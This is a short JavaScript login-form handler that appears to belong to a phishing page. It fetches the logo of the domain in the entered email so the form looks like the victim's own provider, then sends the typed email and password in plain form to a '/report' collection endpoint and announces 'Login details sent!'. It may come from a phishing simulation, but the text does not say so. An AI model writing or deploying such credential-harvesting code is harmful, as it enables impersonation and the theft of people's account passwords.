// @ts-nocheck
document.getElementById('login-form').addEventListener('submit', async function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Get the domain from the email and fetch the logo
    const domain = email.split('@')[1];
    const logoUrl = `https://logo.clearbit.com/${domain}`;
    
    // Set the logo URL
    document.getElementById('logo').src = logoUrl;

    // Send the login details to the backend
    const response = await fetch('http://localhost:3000/report', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            email,
            password
        }),
    });

    const result = await response.json();
    if (response.ok) {
        alert('Login details sent!');
    } else {
        alert('Error: ' + result.message);
    }
});
